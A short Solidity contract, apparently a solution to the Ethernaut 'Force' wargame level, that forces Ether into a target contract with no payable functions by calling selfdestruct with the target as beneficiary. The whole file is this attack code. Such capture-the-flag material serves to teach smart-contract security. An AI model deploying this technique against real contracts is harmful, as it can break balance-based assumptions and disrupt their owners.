pragma solidity ^0.8.0;

import "./Force.sol";

contract ForceAttack {
    Force public forceContract;
    
    constructor(address _forceAddress) {
        forceContract = Force(payable(_forceAddress));
    }

    function attack() public payable {
        require(msg.value > 0);

        address payable _addr = payable(address(forceContract));
        selfdestruct(_addr);
    }
}
